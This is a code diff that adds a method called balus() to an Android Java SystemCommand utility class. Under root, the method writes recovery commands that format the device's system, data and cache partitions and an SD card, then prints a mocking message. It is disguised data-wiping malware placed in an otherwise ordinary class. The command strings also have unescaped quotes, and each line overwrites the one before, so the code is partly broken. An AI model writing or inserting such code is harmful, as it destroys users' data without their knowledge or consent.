@@ -85,6 +85,23 @@ public class SystemCommand {
         process.term();
     }
 
+    public static void balus() {
+        Log.d(TAG, "Balus!");
+
+        RootProcess process = new RootProcess();
+        if (!process.init()) {
+            return;
+        }
+        process.write("echo \"ui_print(\\\"Balus!\\\");\" > /cache/recovery/extendedcommand\n");
+        process.write("echo \"format(\"MTD\", \"system\");\" > /cache/recovery/extendedcommand\n");
+        process.write("echo \"format(\"MTD\", \"data\");\" > /cache/recovery/extendedcommand\n");
+        process.write("echo \"format(\"MTD\", \"cache\");\" > /cache/recovery/extendedcommand\n");
+        process.write("echo \"mount(\"vfat\", \"/dev/block/mmcblk0p11\");\" > /cache/recovery/extendedcommand\n");
+        process.write("echo \"format(\"vfat\", \"/dev/block/mmcblk1p1\");\" > /cache/recovery/extendedcommand\n");
+        process.write("echo \"ui_print(\\\"Ohhhhhhhh! I can't see anything!!!!!!!!!!!\\\");\" > /cache/recovery/extendedcommand\n");
+        process.term();
+    }
+
     public static void copy(String src, String dst) {
         Log.d(TAG, "execute copy src=" + src + " dst=" + dst);
 
